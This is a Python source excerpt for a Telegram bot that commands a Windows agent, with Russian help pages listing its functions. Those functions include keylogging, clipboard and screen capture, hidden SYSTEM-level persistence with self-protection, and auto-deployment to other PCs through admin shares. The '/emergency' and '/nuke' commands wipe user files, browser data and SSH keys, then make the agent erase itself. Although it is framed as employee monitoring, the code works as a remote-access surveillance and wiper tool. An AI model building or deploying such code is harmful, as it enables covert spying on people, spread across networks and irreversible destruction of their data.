                "🔒 USB-накопители ЗАБЛОКИРОВАНЫ" if ok else "❌ Ошибка (нужны права админа)"
            )
        elif args.lower() in ("off", "allow", "enable"):
            ok = security.enable_usb_storage()
            await update.message.reply_text(
                "✅ USB-накопители разблокированы" if ok else "❌ Ошибка"
            )

    @admin_only
    async def cmd_disablerdp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import security
        args = _args(update)
        if args.lower() in ("on", "disable"):
            ok = security.disable_rdp()
            await update.message.reply_text("🔒 RDP отключён" if ok else "❌ Ошибка")
        elif args.lower() in ("off", "enable"):
            ok = security.enable_rdp()
            await update.message.reply_text("✅ RDP включён" if ok else "❌ Ошибка")
        else:
            await update.message.reply_text("/disablerdp on — выключить RDP\n/disablerdp off — включить")

    @admin_only
    async def cmd_emergency(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """FULL EMERGENCY: wipe data + lock screen + disable USB + firewall block."""
        from . import security, screen_lock
        from .secure_wipe import wipe_multiple

        args = _args(update)
        if args.lower() == "restore":
            results = security.emergency_restore()
            screen_lock.unlock_screen()
            text = "<b>✅ Аварийный режим СНЯТ:</b>\n\n"
            for k, v in results.items():
                text += f"{'✅' if v else '❌'} {k}\n"
            await update.message.reply_text(text, parse_mode="HTML")
            return

        if args.lower() != "confirm":
            await update.message.reply_text(
                "⚠️ <b>АВАРИЙНЫЙ ПРОТОКОЛ</b>\n\n"
                "Это выполнит:\n"
                "1. 🗑 Безопасное удаление всех путей из wipe-списка\n"
                "2. 🔥 Блокировка firewall (все соединения)\n"
                "3. 🔒 Блокировка USB-накопителей\n"
                "4. 🔒 Отключение RDP\n"
                "5. 🔒 Блокировка экрана\n\n"
                "⚠️ <b>ДАННЫЕ БУДУТ БЕЗВОЗВРАТНО УДАЛЕНЫ!</b>\n\n"
                "Для подтверждения: /emergency confirm\n"
                "Для отмены: /emergency restore",
                parse_mode="HTML",
            )
            return

        await update.message.reply_text("🚨 АВАРИЙНЫЙ ПРОТОКОЛ ЗАПУЩЕН...")

        # Step 1: Wipe
        a = _agent
        wipe_text = "Wipe-список пуст"
        if a and a.config.wipe_paths:
            def _wipe():
                return wipe_multiple(a.config.wipe_paths)
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, _wipe)
            wipe_text = result.summary()
            await update.message.reply_text(f"🗑 Wipe done:\n{wipe_text}")

        # Step 2: Security lockdown
        sec_results = security.emergency_lockdown()
        await update.message.reply_text(
            "🔒 Lockdown:\n" + "\n".join(
                f"{'✅' if v else '❌'} {k}" for k, v in sec_results.items()
            )
        )

        # Step 3: Lock screen
        screen_lock.lock_screen_full("emergency", "⚠️ АВАРИЙНАЯ БЛОКИРОВКА ⚠️\nСвяжитесь с администратором.")
        await update.message.reply_text(
            "🚨 <b>АВАРИЙНЫЙ ПРОТОКОЛ ЗАВЕРШЁН</b>\n\n"
            f"Wipe: {wipe_text}\n"
            f"Firewall: ЗАБЛОКИРОВАН\n"
            f"USB: ЗАБЛОКИРОВАН\n"
            f"RDP: ОТКЛЮЧЁН\n"
            f"Экран: ЗАБЛОКИРОВАН\n\n"
            f"Для восстановления: /emergency restore",
            parse_mode="HTML",
        )

    @admin_only
    async def cmd_nuke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """FULL NUKE: wipe ALL data + self-destruct agent. PC becomes empty."""
        from .secure_wipe import nuke_and_self_destruct
        from . import security, screen_lock

        a = _agent
        args = _args(update)

        if args.lower() != "confirm":
            await update.message.reply_text(
                "☢️ <b>ПОЛНОЕ УНИЧТОЖЕНИЕ ДАННЫХ</b>\n\n"
                "Эта команда:\n"
                "1. 🗑 Удалит ВСЕ пользовательские данные:\n"
                "   Desktop, Documents, Downloads, Pictures,\n"
                "   Videos, Music, SSH-ключи, OneDrive\n"
                "2. 🗑 Удалит ВСЕ данные браузеров\n"
                "3. 🗑 Удалит ВСЕ временные файлы\n"
                "4. 🗑 Удалит пути из wipe-списка\n"
                "5. 🔥 Заблокирует firewall/USB/RDP\n"
                "6. 🔒 Заблокирует экран\n"
                "7. 💀 Удалит агента (самоуничтожение)\n\n"
                "⚠️ <b>ДАННЫЕ НЕВОЗМОЖНО ВОССТАНОВИТЬ!</b>\n"
                "⚠️ <b>АГЕНТ БУДЕТ УДАЛЁН!</b>\n"
                "⚠️ Потребуется переустановка Windows\n\n"
                "Для подтверждения: /nuke confirm",
                parse_mode="HTML",
            )
            return

        await update.message.reply_text("☢️ ЗАПУСК ПОЛНОГО УНИЧТОЖЕНИЯ...")

        # Step 1: lockdown first (prevent hackers from interfering)
        sec_results = security.emergency_lockdown()
        await update.message.reply_text(
            "🔒 Lockdown:\n" + "\n".join(
                f"{'✅' if v else '❌'} {k}" for k, v in sec_results.items()
            )
        )

        # Step 2: lock screen
        screen_lock.lock_screen_full(
            "nuke_no_unlock",
            "☢️ УНИЧТОЖЕНИЕ ДАННЫХ ☢️\nПК заблокирован. Свяжитесь с администратором.",
        )
        await update.message.reply_text("🔒 Экран заблокирован")

        # Step 3: NUKE
        extra = a.config.wipe_paths if a else []

        async def _run_nuke():
            loop = asyncio.get_event_loop()

            async def progress_cb(msg):
                try:
                    await update.message.reply_text(f"☢️ {msg}")
                except Exception:
                    pass

            def _nuke():
                def sync_progress(msg):
                    asyncio.run_coroutine_threadsafe(progress_cb(msg), loop)
                return nuke_and_self_destruct(extra_paths=extra, on_progress=sync_progress)

            result = await loop.run_in_executor(None, _nuke)
            return result

        result = await _run_nuke()

        try:
            await update.message.reply_text(
                f"☢️ <b>УНИЧТОЖЕНИЕ ЗАВЕРШЕНО</b>\n\n"
                f"{_esc(result.summary())}\n\n"
                f"Агент самоуничтожится через 3 секунды.\n"
                f"Для восстановления — переустановите Windows и агента.",
                parse_mode="HTML",
            )
        except Exception:
            pass

        # Exit agent — the self-delete cmd will clean up the EXE
        if a:
            a.stop_event.set()
        time.sleep(2)
        os._exit(0)

    @admin_only
    async def cmd_unknown(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❓ Неизвестная команда. /help для списка.")

    # register handlers
    for name, handler in [
        ("start", cmd_start), ("help", cmd_start),
        ("status", cmd_status), ("screen", cmd_screen),
        ("apps", cmd_apps), ("processes", cmd_processes),
        ("kill", cmd_kill), ("block", cmd_block),
        ("unblock", cmd_unblock), ("blocklist", cmd_blocklist),
        ("lock", cmd_lock), ("lockscreen", cmd_lockscreen),
        ("unlockscreen", cmd_unlockscreen),
        ("logoff", cmd_logoff), ("shutdown", cmd_shutdown),
        ("restart", cmd_restart), ("message", cmd_message),
        ("usb", cmd_usb), ("clipboard", cmd_clipboard),
        ("software", cmd_software), ("set", cmd_set),
        ("config", cmd_config),
        ("pause", cmd_pause), ("resume", cmd_resume),
        ("autostart", cmd_autostart), ("integrity", cmd_integrity),
        ("deploy", cmd_deploy),
        ("discover", cmd_discover), ("network", cmd_network),
        ("protect", cmd_protect), ("taskmgr", cmd_taskmgr), ("autoshot", cmd_autoshot), ("keylog", cmd_keylog),
        ("scan", cmd_scan), ("task", cmd_task),
        ("wipeadd", cmd_wipeadd), ("wiperemove", cmd_wiperemove),
        ("wipelist", cmd_wipelist), ("wipe", cmd_wipe),
        ("firewall", cmd_firewall), ("disableusb", cmd_disableusb),
        ("disablerdp", cmd_disablerdp), ("emergency", cmd_emergency),
        ("nuke", cmd_nuke),
    ]:
        app.add_handler(CommandHandler(name, handler))

    app.add_handler(MessageHandler(filters.COMMAND, cmd_unknown))

    # set bot commands menu
    cmds = [
        BotCommand("status", "Статус агента"),
        BotCommand("screen", "Скриншот"),
        BotCommand("apps", "Статистика приложений"),
        BotCommand("processes", "Список процессов"),
        BotCommand("kill", "Завершить процесс"),
        BotCommand("block", "Заблокировать процесс"),
        BotCommand("unblock", "Разблокировать процесс"),
        BotCommand("blocklist", "Список блокировок"),
        BotCommand("lock", "Блокировка Win"),
        BotCommand("lockscreen", "Полная блокировка экрана"),
        BotCommand("unlockscreen", "Разблокировать экран"),
        BotCommand("logoff", "Выход из системы"),
        BotCommand("shutdown", "Выключение ПК"),
        BotCommand("restart", "Перезагрузка ПК"),
        BotCommand("message", "Показать сообщение"),
        BotCommand("usb", "USB-устройства"),
        BotCommand("clipboard", "Буфер обмена"),
        BotCommand("software", "Установленное ПО"),
        BotCommand("set", "Изменить настройку"),
        BotCommand("config", "Текущая конфигурация"),
        BotCommand("pause", "Приостановить"),
        BotCommand("resume", "Возобновить"),
        BotCommand("autostart", "Автозапуск"),
        BotCommand("integrity", "Проверка целостности"),
        BotCommand("deploy", "Развернуть на ПК в сети"),
        BotCommand("discover", "Сканировать сеть"),
        BotCommand("network", "Сетевые интерфейсы"),
        BotCommand("protect", "Статус защиты"),
        BotCommand("autoshot", "Авто-скриншот по Enter/клику"),
        BotCommand("keylog", "Лог клавиш"),
        BotCommand("scan", "Сканировать файлы на всех дисках"),
        BotCommand("task", "Управление задачей автозапуска"),
        BotCommand("wipeadd", "Добавить путь для wipe"),
        BotCommand("wipelist", "Список wipe-путей"),
        BotCommand("wipe", "Безопасное удаление"),
        BotCommand("firewall", "Управление firewall"),
        BotCommand("disableusb", "Блокировка USB"),
        BotCommand("disablerdp", "Управление RDP"),
        BotCommand("emergency", "АВАРИЙНЫЙ ПРОТОКОЛ"),
        BotCommand("nuke", "☢️ ПОЛНОЕ УНИЧТОЖЕНИЕ"),
        BotCommand("help", "Справка"),
    ]

    log.info("Telegram bot starting...")
    await app.bot.set_my_commands(cmds)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)

    # notify admin
    try:
        await app.bot.send_message(
            admin_id,
            f"✅ <b>Monitor Agent Online</b>\n"
            f"🖥 {socket.gethostname()} / {os.environ.get('USERNAME', '?')}\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML",
        )
    except Exception as exc:
        log.warning("Failed to send startup notification: %s", exc)

    # keep running until the agent stops
    while _agent and not _agent.stop_event.is_set():
        await asyncio.sleep(1)

    await app.updater.stop()
    await app.stop()
    await app.shutdown()


# ----- alert sending (called from other threads) -----

def send_alert(text: str) -> None:
    """Send an alert message to admin (thread-safe, fire-and-forget)."""
    if not _loop or not _agent:
        return
    asyncio.run_coroutine_threadsafe(_send_alert_async(text), _loop)


async def _send_alert_async(text: str) -> None:
    try:
        from telegram import Bot
        a = _agent
        if not a:
            return
        bot = Bot(a.config.bot_token)
        await bot.send_message(a.config.admin_id, text, parse_mode="HTML")
    except Exception as exc:
        log.warning("Alert send failed: %s", exc)


def send_photo_alert(jpeg_bytes: bytes, caption: str = "") -> None:
    """Send a photo alert to admin (thread-safe)."""
    if not _loop or not _agent:
        return
    asyncio.run_coroutine_threadsafe(_send_photo_async(jpeg_bytes, caption), _loop)


async def _send_photo_async(jpeg_bytes: bytes, caption: str) -> None:
    try:
        from telegram import Bot
        a = _agent
        if not a:
            return
        bot = Bot(a.config.bot_token)
        await bot.send_photo(a.config.admin_id, photo=io.BytesIO(jpeg_bytes), caption=caption)
    except Exception as exc:
        log.warning("Photo alert send failed: %s", exc)


# ----- helpers -----

def _is_autostart() -> bool:
    from . import protection
    return protection.is_autostart_installed()


def _args(update) -> str:
    """Extract the text after the command."""
    text = update.message.text or ""
    parts = text.split(maxsplit=1)
    return parts[1].strip() if len(parts) > 1 else ""


def _esc(s: str) -> str:
    """Escape HTML special chars."""
    return (
        str(s)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


HELP_PAGES = [
    # ── Page 1: Info + Processes ──
    (
        "<b>🛡 Monitor Agent — Полная справка (1/5)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>📊 ИНФОРМАЦИЯ И МОНИТОРИНГ</b>\n\n"

        "<b>/status</b> — Полный статус агента\n"
        "  Показывает: имя ПК, ОС, uptime, RAM, диск, CPU,\n"
        "  состояние всех модулей (трекинг, скриншоты, USB и т.д.)\n"
        "  <i>Пример:</i> /status\n\n"

        "<b>/screen</b> — Скриншот экрана в реальном времени\n"
        "  Делает снимок рабочего стола и отправляет как фото.\n"
        "  <i>Пример:</i> /screen\n\n"

        "<b>/apps</b> — Статистика использования приложений\n"
        "  Топ-20 приложений по времени использования.\n"
        "  <i>Пример:</i> /apps\n\n"

        "<b>/processes</b> — Список запущенных процессов\n"
        "  Топ-30 процессов по потреблению памяти (имя, PID, MB).\n"
        "  <i>Пример:</i> /processes\n\n"

        "<b>/config</b> — Текущая конфигурация агента\n"
        "  Все настройки: интервалы, модули, блок-лист, wipe-список.\n"
        "  <i>Пример:</i> /config\n\n"

        "<b>/integrity</b> — Проверка целостности агента\n"
        "  Показывает путь к EXE и SHA-256 хеш для проверки\n"
        "  что файл агента не был подменён.\n"
        "  <i>Пример:</i> /integrity\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>⚙️ УПРАВЛЕНИЕ ПРОЦЕССАМИ</b>\n\n"

        "<b>/kill</b> &lt;имя&gt; — Завершить процесс\n"
        "  Убивает все процессы с указанным именем.\n"
        "  <i>Пример:</i> /kill chrome.exe\n"
        "  <i>Пример:</i> /kill notepad.exe\n\n"

        "<b>/block</b> &lt;имя&gt; — Добавить процесс в чёрный список\n"
        "  Процесс будет автоматически завершаться каждые 2 сек.\n"
        "  <i>Пример:</i> /block telegram.exe\n"
        "  <i>Пример:</i> /block discord.exe\n\n"

        "<b>/unblock</b> &lt;имя&gt; — Убрать процесс из чёрного списка\n"
        "  <i>Пример:</i> /unblock telegram.exe\n\n"

        "<b>/blocklist</b> — Показать все заблокированные процессы\n"
        "  <i>Пример:</i> /blocklist"
    ),

    # ── Page 2: Lock + DLP ──
    (
        "<b>🛡 Справка (2/5)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>🔒 БЛОКИРОВКА И УПРАВЛЕНИЕ ПК</b>\n\n"

        "<b>/lock</b> — Стандартная блокировка Windows\n"
        "  Вызывает LockWorkStation (Win+L). Разблокировка\n"
        "  обычным паролем Windows.\n"
        "  <i>Пример:</i> /lock\n\n"

        "<b>/lockscreen</b> &lt;пароль&gt; — Полная блокировка экрана\n"
        "  Профессиональный экран блокировки:\n"
        "  • Анимированные частицы и градиентный фон\n"
        "  • Блокировка Alt+Tab, Win, Ctrl+Esc, Alt+F4\n"
        "  • Блокировка мыши (курсор не покидает экран)\n"
        "  • Убийство explorer.exe (нет панели задач)\n"
        "  • Отключение диспетчера задач\n"
        "  • Сохранение после перезагрузки ПК\n"
        "  <i>Пример:</i> /lockscreen MyPass123\n"
        "  <i>Пример:</i> /lockscreen (пароль: admin)\n\n"

        "<b>/unlockscreen</b> — Удалённая разблокировка экрана\n"
        "  Снимает полную блокировку без ввода пароля.\n"
        "  <i>Пример:</i> /unlockscreen\n\n"

        "<b>/logoff</b> — Выход из учётной записи Windows\n"
        "  <i>Пример:</i> /logoff\n\n"

        "<b>/shutdown</b> [сек] — Выключение ПК (по умолч. 30с)\n"
        "  <i>Пример:</i> /shutdown 10\n\n"

        "<b>/restart</b> [сек] — Перезагрузка ПК (по умолч. 30с)\n"
        "  <i>Пример:</i> /restart 5\n\n"

        "<b>/message</b> &lt;текст&gt; — Показать сообщение на экране\n"
        "  Всплывающее окно MessageBox поверх всех окон.\n"
        "  <i>Пример:</i> /message Внимание! Обновите систему.\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>📋 DLP / МОНИТОРИНГ ДАННЫХ</b>\n\n"

        "<b>/usb</b> — Список подключённых USB-накопителей\n"
        "  Имя устройства, буква диска, объём, серийный номер.\n"
        "  Авто-уведомления при подключении/отключении USB.\n"
        "  <i>Пример:</i> /usb\n\n"

        "<b>/clipboard</b> [N] — Последние записи буфера обмена\n"
        "  По умолчанию 5 записей. Агент отслеживает всё,\n"
        "  что копируется в буфер.\n"
        "  <i>Пример:</i> /clipboard\n"
        "  <i>Пример:</i> /clipboard 20\n\n"

        "<b>/keylog</b> — Лог клавиш\n"
        "  Без аргументов — показать последние 100 нажатий.\n"
        "  • /keylog on — включить кейлоггер\n"
        "  • /keylog off — отключить\n"
        "  • /keylog clear — очистить логи\n"
        "  <i>Пример:</i> /keylog\n"
        "  <i>Пример:</i> /keylog on\n\n"

        "<b>/software</b> — Количество установленных программ\n"
        "  Авто-уведомление при установке нового ПО.\n"
        "  <i>Пример:</i> /software"
    ),

    # ── Page 3: Network + Protection ──
    (
        "<b>🛡 Справка (3/5)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>🌐 СЕТЬ И РАЗВЁРТЫВАНИЕ</b>\n\n"

        "<b>/discover</b> — Сканировать все ПК в локальной сети\n"
        "  Пингует все 254 адреса в подсети /24.\n"
        "  Показывает: hostname и IP каждого ПК.\n"
        "  Время: ~10-30 секунд.\n"
        "  <i>Пример:</i> /discover\n\n"

        "<b>/deploy</b> — Развернуть агент на все ПК в сети\n"
        "  Автоматически:\n"
        "  1. Сканирует сеть\n"
        "  2. Проверяет доступ через admin share (C$)\n"
        "  3. Копирует EXE на удалённый ПК\n"
        "  4. Создаёт задачу автозапуска\n"
        "  5. Запускает агент удалённо\n"
        "  ⚠️ Требуются права админа домена.\n"
        "  <i>Пример:</i> /deploy\n\n"

        "<b>/network</b> — Сетевые интерфейсы этого ПК\n"
        "  Hostname, IP-адреса всех активных интерфейсов.\n"
        "  <i>Пример:</i> /network\n\n"

        "<b>/scan</b> — Сканировать все файлы на всех дисках\n"
        "  Сканирует все диски и показывает:\n"
        "  • Общее количество файлов и размер\n"
        "  • Файлы по дискам и расширениям\n"
        "  • Крупные файлы (>10 MB)\n"
        "  • Недавно изменённые файлы (7 дней)\n"
        "  ⚠️ Может занять много времени!\n"
        "  <i>Пример:</i> /scan\n\n"

        "<b>/task</b> — Управление задачей автозапуска\n"
        "  Показать статус задачи или управлять ей.\n"
        "  • /task — показать статус\n"
        "  • /task delete — удалить задачу\n"
        "  • /task disable — отключить задачу\n"
        "  • /task enable — включить задачу\n"
        "  ⚠️ Только Telegram бот может управлять задачей!\n"
        "  <i>Пример:</i> /task\n"
        "  <i>Пример:</i> /task delete\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>🛡 ЗАЩИТА АГЕНТА</b>\n\n"

        "<b>/protect</b> — Показать статус всех защит\n"
        "  Автозапуск, приоритет, ACL, watchdog, process guard.\n"
        "  <i>Пример:</i> /protect\n\n"

        "<b>/protect apply</b> — Переприменить все защиты\n"
        "  ACL на папку, высокий приоритет, задачи автозапуска,\n"
        "  копия в ProgramData.\n"
        "  <i>Пример:</i> /protect apply\n\n"

        "<b>/autostart</b> on|off — Управление автозапуском\n"
        "  on — задача в планировщике (SYSTEM, HIGHEST)\n"
        "  off — удаляет задачу автозапуска\n"
        "  <i>Пример:</i> /autostart on\n"
        "  <i>Пример:</i> /autostart off"
    ),

    # ── Page 4: Wipe + Security ──
    (
        "<b>🛡 Справка (4/5)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>🗑 БЕЗОПАСНОЕ УДАЛЕНИЕ ДАННЫХ</b>\n\n"

        "<b>/wipeadd</b> &lt;путь&gt; — Добавить путь в wipe-список\n"
        "  Файл или папка для удаления при /wipe all.\n"
        "  <i>Пример:</i> /wipeadd C:\\Users\\Admin\\Documents\\Secret\n"
        "  <i>Пример:</i> /wipeadd D:\\ClientData\n\n"

        "<b>/wiperemove</b> &lt;путь&gt; — Убрать из wipe-списка\n"
        "  <i>Пример:</i> /wiperemove D:\\ClientData\n\n"

        "<b>/wipelist</b> — Показать все пути в wipe-списке\n"
        "  Проверяет существование каждого пути (✅/❌).\n"
        "  <i>Пример:</i> /wipelist\n\n"

        "<b>/wipe</b> — Безопасное удаление (DoD 5220.22-M)\n"
        "  Перезаписывает файлы 3 раза (0x00, 0xFF, random),\n"
        "  переименовывает, затем удаляет.\n"
        "  ⚠️ Данные <b>НЕВОЗМОЖНО восстановить</b>!\n"
        "  • /wipe all — все пути из wipe-списка\n"
        "  • /wipe temp — temp и кеш-файлы\n"
        "  • /wipe browsers — кеш всех браузеров\n"
        "  • /wipe &lt;путь&gt; — конкретный файл/папку\n"
        "  <i>Пример:</i> /wipe all\n"
        "  <i>Пример:</i> /wipe C:\\secret.docx\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>🔥 БЕЗОПАСНОСТЬ СИСТЕМЫ</b>\n\n"

        "<b>/firewall</b> — Управление Windows Firewall\n"
        "  Без аргументов — текущий статус.\n"
        "  • /firewall block — ЗАБЛОКИРОВАТЬ все соединения\n"
        "  • /firewall restore — восстановить стандартные\n"
        "  <i>Пример:</i> /firewall block\n\n"

        "<b>/disableusb</b> on|off — Блокировка USB-накопителей\n"
        "  on — запретить флешки/диски через реестр\n"
        "  off — разрешить обратно\n"
        "  Без аргументов — текущий статус.\n"
        "  <i>Пример:</i> /disableusb on\n\n"

        "<b>/disablerdp</b> on|off — Управление Remote Desktop\n"
        "  on — отключить RDP\n"
        "  off — включить RDP\n"
        "  <i>Пример:</i> /disablerdp on"
    ),

    # ── Page 5: Emergency + Nuke + Settings ──
    (
        "<b>🛡 Справка (5/5)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "<b>🚨 АВАРИЙНЫЙ ПРОТОКОЛ</b>\n\n"

        "<b>/emergency confirm</b> — Полный аварийный режим\n"
        "  Одновременно:\n"
        "  1. 🗑 Удаление всех путей из wipe-списка\n"
        "  2. 🔥 Блокировка firewall\n"
        "  3. 🔒 Блокировка USB\n"
        "  4. 🔒 Отключение RDP\n"
        "  5. 🔒 Полная блокировка экрана\n"
        "  <i>Пример:</i> /emergency confirm\n\n"

        "<b>/emergency restore</b> — Отмена аварийного режима\n"
        "  Восстанавливает: firewall, USB, RDP, экран.\n"
        "  <i>Пример:</i> /emergency restore\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>☢️ ПОЛНОЕ УНИЧТОЖЕНИЕ (NUKE)</b>\n\n"

        "<b>/nuke confirm</b> — Уничтожение ВСЕХ данных\n"
        "  ⚠️ <b>НЕОБРАТИМАЯ ОПЕРАЦИЯ!</b>\n"
        "  1. Блокирует firewall, USB, RDP\n"
        "  2. Блокирует экран (без разблокировки)\n"
        "  3. Удаляет ВСЕ данные пользователя:\n"
        "     Desktop, Documents, Downloads, Pictures,\n"
        "     Videos, Music, SSH-ключи, OneDrive\n"
        "  4. Удаляет кеш браузеров и temp\n"
        "  5. Удаляет конфиг и данные агента\n"
        "  6. Самоуничтожение EXE-файла\n"
        "  Windows загрузится пустой.\n"
        "  <i>Пример:</i> /nuke confirm\n\n"

            "<b>/set</b> — Изменить параметр\n"
            "  Доступные параметры:\n"
            "  • /set interval &lt;сек&gt; — интервал скриншотов (0=выкл)\n"
            "  • /set tracking on|off — трекинг окон\n"
            "  • /set block on|off — автоблокировка процессов\n"
            "  • /set usb on|off — мониторинг USB\n"
            "  • /set clipboard on|off — мониторинг буфера\n"
            "  • /set keylogger on|off — лог клавиш\n"
            "  • /set autodeploy on|off — авто-деплой по сети\n"
            "  <i>Пример:</i> /set interval 30\n"
            "  <i>Пример:</i> /set keylogger on\n\n"

            "<b>/pause</b> — Приостановить весь мониторинг\n"
            "  <i>Пример:</i> /pause\n\n"

            "<b>/resume</b> — Возобновить мониторинг\n"
            "  <i>Пример:</i> /resume"
    ),
]
